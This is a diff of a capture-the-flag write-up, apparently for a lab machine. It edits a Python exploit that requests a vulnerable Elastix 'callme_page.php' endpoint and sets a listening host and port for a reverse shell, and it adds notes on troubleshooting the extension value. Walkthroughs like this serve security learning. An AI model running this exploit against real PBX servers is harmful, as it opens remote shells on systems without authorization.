@@ -119,7 +119,7 @@ import ssl
 rhost="10.129.84.71" # Target address
 lhost="10.10.14.21"  # Our listening address
 lport=443
-extension=233
+extension=1000
 
 # Reverse shell payload
 
@@ -128,7 +128,16 @@ url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c&callmenum
 urllib.request.urlopen(url, context=ssl.SSLContext(ssl.PROTOCOL_TLSv1))
 ```
 
-This one did the trick. I made sure the connection used TLS 1.0. In addition I had to change the extension. It used to be 1000.
+This runs without any issue, but does not connect. Either the exploit does not work, or we have to change something with the payload.
+
+What variables do we have?
+
+- rhost, can't change
+- lhost, can't change
+- lport, can't change
+- extension, can change.
+
+So lets try changing the extension. But first we need to figure out what the extension actually is. It's essentially an additional telephone wired to the same telephone line as another. And can be up to 4 digits long. 
 
 
 ```
